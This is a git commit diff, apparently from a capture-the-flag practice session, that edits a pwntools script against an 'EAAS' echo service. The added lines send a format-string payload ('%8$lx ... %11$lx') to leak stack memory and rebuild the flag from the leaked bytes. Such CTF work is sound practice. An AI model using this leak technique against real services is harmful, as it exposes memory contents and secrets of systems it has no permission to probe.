a1dec874494b703a3474576ec205e1b5f7de54ba
Expressionless <expressionless.dev@gmail.com>
2026-09-16 01:06:13 +0000

    upsolve eaas

--- eaas/tmpl.py
+++ eaas/tmpl.py
@@ -1,5 +1,5 @@
 from pwn import *
-from config import REMOTE_ADDR, REMOTE_PORT
+#from config import REMOTE_ADDR, REMOTE_PORT
 
 REMOTE = 0 # Change to 1 to run the exploit on the remote instance
 
@@ -16,5 +16,12 @@ def echo(text):
     p.sendlineafter(b"[EAAS]> ", text)
     return p.recvline().decode().strip();
 
+res = echo("%8$lx %9$lx %10$lx %11$lx").split(" ")
+arr = bytearray()
+for i in range(0, 3):
+    x = res[i]
+    arr += bytes.fromhex(x)[::-1]
 
-echo("joseph")
+# Flag has a new line
+arr += bytes.fromhex(res[3][1:])[::-1]
+print(arr)
